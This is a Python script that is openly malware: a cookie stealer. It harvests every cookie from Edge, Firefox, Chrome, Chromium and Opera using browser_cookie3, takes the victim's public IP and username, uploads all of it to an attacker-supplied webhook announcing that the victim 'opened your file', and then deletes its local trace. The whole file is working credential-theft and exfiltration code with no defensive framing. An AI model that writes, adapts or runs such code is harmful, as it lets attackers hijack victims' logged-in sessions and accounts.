import os
import requests
import browser_cookie3

webhook_url = "WEBHOOK HERE!!!!!"

def SillyIP():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def SillyGrab():
    browsers = {
        "Edge": browser_cookie3.edge,
        "Firefox": browser_cookie3.firefox,
        "Chrome": browser_cookie3.chrome,
        "Chromium": browser_cookie3.chromium,
        "Opera": browser_cookie3.opera
    }

    cookies = []
    for browser_name, browser_function in browsers.items():
        try:
            cj = browser_function()
            for cookie in cj:
                cookies.append(f"{browser_name}\t{cookie.domain}\t{cookie.name}\t{cookie.value}")
        except:
            continue  # IGNOREENDSNF

    return cookies

def hooker(webhook_url, file_path, user_info):
    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f)
            }
            data = {
                'content': f"**{user_info}** opened your file"
            }
            requests.post(webhook_url, data=data, files=files)
    except:
        pass  # Ignoreeikfsdmfkjds

def delete_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass  # if we get ANY ERROR we ignore it

def main():
    try:
        username = os.getlogin()
        public_ip = SillyIP()
        user_info = f"{public_ip} | {username}"

        # Get cookies
        cookies = SillyGrab()
        cookies_file_path = "SillyCookies.txt"
        with open(cookies_file_path, 'w', encoding='utf-8') as f:
            f.write("Browser\tDomain\tName\tValue\n")
            f.write("\n".join(cookies))

        # Send to webhook
        hooker(webhook_url, cookies_file_path, user_info)

        # Send user info
        hooker(webhook_url, user_info)

        delete_file(cookies_file_path)
    except:
        delete_file(cookies_file_path)

if __name__ == "__main__":
    main()
